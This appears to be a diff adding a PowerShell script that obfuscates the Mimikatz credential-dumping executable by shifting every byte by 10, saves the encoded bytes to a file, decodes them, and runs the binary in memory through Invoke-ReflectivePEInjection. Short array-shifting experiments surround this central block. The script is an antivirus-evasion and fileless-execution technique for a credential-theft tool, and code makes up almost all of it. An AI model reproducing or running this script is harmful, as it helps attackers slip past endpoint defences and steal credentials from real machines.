@@ -1,0 +1,63 @@
+$array = 1, 2, 3, 4, 5
+$array = $array | ForEach-Object {
+    if (($_ + 10) % 255 -lt 0) {
+         $_ + 10 + 255
+    } else {
+         $_ + 10
+    }
+
+}
+$array 
+
+
+
+
+$array = 1, 2, 3, 4, 5
+$array = $array | ForEach-Object {
+    if (($_ - 10) % 255 -lt 0) {
+         $_ - 10 + 255
+    } else {
+         $_ - 10
+    }
+
+}
+$array 
+
+
+
+
+$PEBytes = [IO.File]::ReadAllBytes('mimikatz.exe') ;
+$PEBytes2 = $PEBytes | ForEach-Object {
+    if (($_ + 10) % 255 -lt 0) {
+         $_ + 10 + 255
+    } else {
+         $_ + 10
+    }
+}
+#Write-Host ("{0}" -f ([string]::Join(",", $PEBytes2)))
+"{0}" -f ([string]::Join(",", $PEBytes2)) > m1m10.bin
+
+$str = cat .\m1m10.bin
+$stringArray = $str -split ','
+$PEBytes2imp = $stringArray | ForEach-Object { [int]$_ }
+$PEBytes3 = $PEBytes2imp| ForEach-Object {
+    if (($_ - 10) % 255 -lt 0) {
+         $_ - 10 + 255
+    } else {
+         $_ - 10
+    }
+}
+Import-Module .\Desktop\Exception\Invoke-ReflectivePEInjection.ps1
+Invoke-ReflectivePEInjection  -PEBytes $PEBytes3 -ExeArgs "coffee exit"
+
+
+
+
+
+
+$array = 1, 2, 3, 4, 5
+$array = $array | ForEach-Object { ($_ + 10) % 255 }
+
+
+$array = 1, 2, 3, 4, 5
+Write-Host ("{0}" -f ([string]::Join(",", $array)))
